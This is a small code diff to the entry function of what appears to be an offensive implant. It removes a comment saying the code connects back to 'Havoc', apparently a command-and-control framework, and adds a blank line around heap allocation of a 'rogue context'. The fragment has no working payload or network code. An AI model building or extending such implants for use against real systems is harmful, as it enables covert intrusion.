@@ -29,8 +29,7 @@ typedef struct
  *
  * Purpose:
  *
- * 'Main' logic and tasking loop. Connects back
- * to Havoc.
+ * 'Main' logic and tasking loop.
  *
 !*/
 D_SEC( B ) VOID WINAPI Entry( VOID )
@@ -49,6 +48,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 	/* Create a buffer to hold the rogue context */
 	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( ROGUE_CTX ) ) ) != NULL ) {
+
 		/* 'Free' the memory block for the rogue context */
 		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
 	};
